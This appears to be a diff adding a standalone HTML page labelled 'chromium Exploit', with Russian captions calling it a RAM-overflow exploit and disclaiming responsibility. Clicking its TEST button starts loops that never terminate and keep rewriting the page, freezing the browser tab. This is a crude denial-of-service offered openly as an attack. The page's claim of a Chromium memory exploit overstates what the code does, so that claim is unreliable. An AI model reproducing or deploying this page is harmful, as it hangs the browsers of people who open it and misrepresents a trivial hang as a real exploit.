@@ -1,0 +1,73 @@
+<html>
+
+    <style>
+        .html{
+            background-color: #f0f0f0;
+        }
+         @font-face {
+        font-family: WR;
+        src: url("https://hcpp20334.github.io/fonts/FeatureMono-Light.woff");
+        font-weight:700;
+    }
+    .ytx{
+        font-size: 22px;
+        font-family: 'WR';
+        color: #010409;
+        text-align: left;
+        margin: 10px;
+       
+    }
+    .yrtx{
+        font-size: 22px;
+        font-family: 'WR';
+        color: #ff0033;
+        text-align: left;
+        margin: 10px;
+        
+    }
+    .gxclass{
+        background: transparent;
+        border: 1px solid #010409;
+        font-size: 22px;
+        width: 200px;
+        font-family: 'WR';
+        color: #010409;
+        transition: .4s;
+        margin: 20px;
+        &:hover{
+            background: #010409;
+            color: #ffffff;
+        }
+    }
+    .frame-container{
+        background: transparent;
+        border: 1px solid #010409; 
+        width: 600px;
+        height: 400px;
+    }
+    </style>
+<div class="frame-container">
+    <p class="ytx">chromium Exploit</p>
+    <p class="ytx">Эксплоит переполнение оперативной памяти</p>
+<button class="gxclass" id="gx">TEST</button>
+<p class="yrtx">Внимание все что вы делаете на свой страх и риск</p>
+</div>
+<script>
+let maxTrack = 27;
+let startExploit = document.getElementById('gx');
+startExploit.onclick = function(){
+    for(let t = 0;t <= maxTrack; setTimeout("t++",100)){
+   document.documentElement.innerHTML = "<p> count:"+t+"</p>";
+    } 
+    for(let t2 = 0;t2 <= maxTrack; setTimeout("t2++",100)){
+   document.documentElement.innerHTML = "<p> count:"+t2+"</p>";
+    } 
+    for(let t3 = 0;t3 <= maxTrack; setTimeout("t3++",100)){
+   document.documentElement.innerHTML = "<p> count:"+t3+"</p>";
+    } 
+    for(let t4 = 0;t4 <= maxTrack; setTimeout("t4++",100)){
+   document.documentElement.innerHTML = "<p> count:"+t4+"</p>";
+    } 
+}
+</script>
+</html>
